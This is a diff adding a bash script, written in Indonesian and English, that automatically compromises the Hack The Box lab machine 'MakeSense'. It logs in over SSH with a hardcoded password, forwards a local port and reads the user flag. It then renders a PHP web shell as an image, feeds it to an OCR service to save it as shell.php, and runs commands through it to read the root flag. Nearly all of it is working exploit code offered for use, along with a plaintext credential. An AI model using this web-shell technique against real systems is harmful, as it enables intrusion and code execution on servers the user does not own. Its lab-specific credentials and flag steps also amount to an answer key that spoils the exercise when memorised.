@@ -1,0 +1,188 @@
+#!/bin/bash
+
+# ============================================
+# HTB MakeSense - FULL AUTO PWN
+# BASCA - ORANG SIBER INDONESIA
+# ============================================
+
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+NC='\033[0m'
+
+clear
+
+echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════╗${NC}"
+echo -e "${BLUE}║                                                                 ║${NC}"
+echo -e "${BLUE}║   ██████╗  █████╗ ███████╗ ██████╗ █████╗                      ║${NC}"
+echo -e "${BLUE}║   ██╔══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗                    ║${NC}"
+echo -e "${BLUE}║   ██████╔╝███████║███████╗██║     ███████║                     ║${NC}"
+echo -e "${BLUE}║   ██╔══██╗██╔══██║╚════██║██║     ██╔══██║                    ║${NC}"
+echo -e "${BLUE}║   ██████╔╝██║  ██║███████║╚██████╗██║  ██║                     ║${NC}"
+echo -e "${BLUE}║   ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝                     ║${NC}"
+echo -e "${BLUE}║                                                                 ║${NC}"
+echo -e "${GREEN}║        🇮🇩 ORANG SIBER INDONESIA 🇮🇩                             ║${NC}"
+echo -e "${YELLOW}║       KEEP LEARNING & KEEP SHARING !!                           ║${NC}"
+echo -e "${BLUE}║         HACK THE BOX - MakeSense                               ║${NC}"
+echo -e "${BLUE}║          AUTOMATED ATTACK CHAIN                                ║${NC}"
+echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════╝${NC}"
+echo ""
+
+echo -e "${YELLOW}[+] Created by: BASCA${NC}"
+echo -e "${YELLOW}[+] Team: Orang Siber Indonesia${NC}"
+echo -e "${YELLOW}[+] Box: HTB MakeSense${NC}"
+echo ""
+
+# ============================================
+# INPUT
+# ============================================
+read -p "Masukkan IP Target: " TARGET_IP
+read -p "Masukkan IP Kali: " KALI_IP
+
+WALTER_PASS="JbhHDAEgXvri3!"
+KALI_IP=${KALI_IP:-"10.10.14.38"}
+
+echo -e "\n${GREEN}[+] Target: $TARGET_IP${NC}"
+echo -e "${GREEN}[+] Kali: $KALI_IP${NC}"
+
+# ============================================
+# 1. Setup Hosts
+# ============================================
+echo -e "\n${BLUE}[1/7] Setup hosts...${NC}"
+sudo sed -i "/makesense.htb/d" /etc/hosts
+echo "$TARGET_IP makesense.htb" | sudo tee -a /etc/hosts > /dev/null
+echo -e "${GREEN}[+] Hosts updated${NC}"
+
+# ============================================
+# 2. Kill Port 8001
+# ============================================
+echo -e "\n${BLUE}[2/7] Bersihkan port 8001...${NC}"
+pkill -f "ssh -L 8001:localhost:8001" 2>/dev/null
+sudo fuser -k 8001/tcp 2>/dev/null
+sleep 2
+echo -e "${GREEN}[+] Port 8001 bersih${NC}"
+
+# ============================================
+# 3. SSH Port Forwarding
+# ============================================
+echo -e "\n${BLUE}[3/7] Setup Port Forwarding...${NC}"
+
+sshpass -p "$WALTER_PASS" ssh -f -N -L 8001:localhost:8001 -o StrictHostKeyChecking=no walter@$TARGET_IP
+
+if [ $? -eq 0 ]; then
+    echo -e "${GREEN}[+] Port forwarding berjalan di port 8001${NC}"
+else
+    echo -e "${RED}[-] Port forwarding gagal!${NC}"
+    exit 1
+fi
+
+sleep 3
+
+# ============================================
+# 4. Ambil User Flag
+# ============================================
+echo -e "\n${BLUE}[4/7] Ambil User Flag...${NC}"
+
+USER_FLAG=$(sshpass -p "$WALTER_PASS" ssh -o StrictHostKeyChecking=no walter@$TARGET_IP "cat /home/walter/user.txt" 2>/dev/null)
+
+if [ -n "$USER_FLAG" ]; then
+    echo -e "${GREEN}[+] User Flag: $USER_FLAG${NC}"
+else
+    echo -e "${RED}[-] Gagal ambil User Flag!${NC}"
+    exit 1
+fi
+
+# ============================================
+# 5. Generate Payload
+# ============================================
+echo -e "\n${BLUE}[5/7] Generate OCR Payload...${NC}"
+
+cat > /tmp/exploit.py << 'EOF'
+from PIL import Image, ImageDraw, ImageFont
+import base64
+
+img = Image.new('RGB', (700, 60), 'white')
+d = ImageDraw.Draw(img)
+try:
+    font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf', 18)
+except:
+    font = ImageFont.load_default()
+d.text((5, 20), '<?php system($_GET["c"]); ?>', fill='black', font=font)
+img.save('/tmp/shell.png')
+
+with open('/tmp/shell.png', 'rb') as f:
+    print(base64.b64encode(f.read()).decode())
+EOF
+
+python3 /tmp/exploit.py > /tmp/shell.b64 2>/dev/null
+
+if [ ! -s /tmp/shell.b64 ]; then
+    echo -e "${RED}[-] Gagal generate payload!${NC}"
+    exit 1
+fi
+echo -e "${GREEN}[+] Payload siap${NC}"
+
+# ============================================
+# 6. Setup OCR & Ambil Root Flag
+# ============================================
+echo -e "\n${BLUE}[6/7] Setup OCR dan ambil Root Flag...${NC}"
+
+# Upload ke OCR
+OCR_ID=$(curl -s -c /tmp/jar -b /tmp/jar -u 'walter:JbhHDAEgXvri3!' -X POST http://localhost:8001/ \
+  --data-urlencode "canvas_image=data:image/png;base64,$(cat /tmp/shell.b64)" \
+  | grep -oP 'ocr_id" value="\K[^"]+')
+
+if [ -z "$OCR_ID" ]; then
+    echo -e "${RED}[-] Gagal upload ke OCR!${NC}"
+    echo -e "${YELLOW}[!] Coba manual di browser:${NC}"
+    echo "1. Buka: http://walter:JbhHDAEgXvri3!@localhost:8001"
+    echo "2. Gambar: <?php system(\$_GET[\"c\"]); ?>"
+    echo "3. Recognize → Save as: shell.php"
+    exit 1
+fi
+
+echo -e "${YELLOW}[+] OCR_ID: $OCR_ID${NC}"
+
+# Save shell.php
+curl -s -b /tmp/jar -u 'walter:JbhHDAEgXvri3!' -X POST http://localhost:8001/ \
+  --data "ocr_id=$OCR_ID&filename=shell.php&save_output=1" > /dev/null
+
+echo -e "${GREEN}[+] shell.php berhasil dibuat!${NC}"
+
+# Ambil Root Flag
+ROOT_FLAG=$(curl -s -u 'walter:JbhHDAEgXvri3!' \
+  "http://localhost:8001/saved/shell.php?c=cat%20/root/root.txt" 2>/dev/null | grep -v "<!DOCTYPE" | grep -v "<html" | grep -v "Not Found" | head -1)
+
+# ============================================
+# 7. HASIL
+# ============================================
+echo -e "\n${BLUE}╔══════════════════════════════════════════════════════════════════╗${NC}"
+echo -e "${BLUE}║                                                                 ║${NC}"
+echo -e "${GREEN}║                    🏆 HASIL AKHIR 🏆                           ║${NC}"
+echo -e "${BLUE}║                                                                 ║${NC}"
+echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════╝${NC}"
+
+if [ -n "$ROOT_FLAG" ]; then
+    echo -e "${GREEN}[+] User Flag: $USER_FLAG${NC}"
+    echo -e "${GREEN}[+] Root Flag: $ROOT_FLAG${NC}"
+    echo ""
+    echo -e "${YELLOW}╔══════════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${YELLOW}║                                                                 ║${NC}"
+    echo -e "${GREEN}║              ✅ MakeSense PWNED! ✅                             ║${NC}"
+    echo -e "${YELLOW}║                                                                 ║${NC}"
+    echo -e "${YELLOW}╚══════════════════════════════════════════════════════════════════╝${NC}"
+else
+    echo -e "${RED}[-] Gagal ambil Root Flag!${NC}"
+    echo -e "${YELLOW}[!] Coba manual:${NC}"
+    echo "curl -u 'walter:JbhHDAEgXvri3!' 'http://localhost:8001/saved/shell.php?c=cat%20/root/root.txt'"
+fi
+
+# ============================================
+# 8. Bersih-bersih
+# ============================================
+pkill -f "ssh -L 8001:localhost:8001" 2>/dev/null
+rm -f /tmp/exploit.py /tmp/shell.b64 /tmp/shell.png 2>/dev/null
+
+echo -e "\n${GREEN}[+] Selesai!${NC}"
+echo -e "${YELLOW}[+] Keep Learning & Keep Sharing !!${NC}"
